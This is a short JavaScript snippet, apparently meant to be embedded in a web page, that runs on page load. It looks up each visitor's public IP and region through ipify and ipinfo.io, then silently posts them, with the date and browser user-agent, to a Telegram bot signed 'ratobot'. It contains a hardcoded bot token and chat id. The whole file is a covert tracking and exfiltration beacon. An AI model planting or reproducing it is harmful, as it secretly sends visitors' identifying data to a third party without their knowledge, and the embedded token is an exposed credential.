async function send(ip, regiao) {
    const token = '7779884701:AAF4GMmlBUUNKUU908UeFg4hvHyXEX5XCJQ';
    const ci = '7110141340';
    const dt = new Date();
    const df = dt.toLocaleString('pt-BR');
    const ua = navigator.userAgent;

    const msg = `Acesso de:\nIP: ${ip}\nRegião: ${regiao}\nData: ${df}\nUser-Agent: ${ua}\n\n\n\n -=[ ratobot ]=-`;
    const url = `https://api.telegram.org/bot${token}/sendMessage`;

    await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: ci,
            text: msg,
        }),
    });
}

async function get() {
    try {
     
        const responseIP = await fetch('https://api.ipify.org?format=json');
        const dataIP = await responseIP.json();
        const ip = dataIP.ip;

    
        const responseLocation = await fetch(`https://ipinfo.io/${ip}/json`);
        const dataLocation = await responseLocation.json();
        console.log(dataLocation);

  
        const regiao = dataLocation.region || "Região não encontrada";

     
        await send(ip, regiao);
    } catch (error) {
        console.error('Erro:', error);
    }
}

window.onload = get;
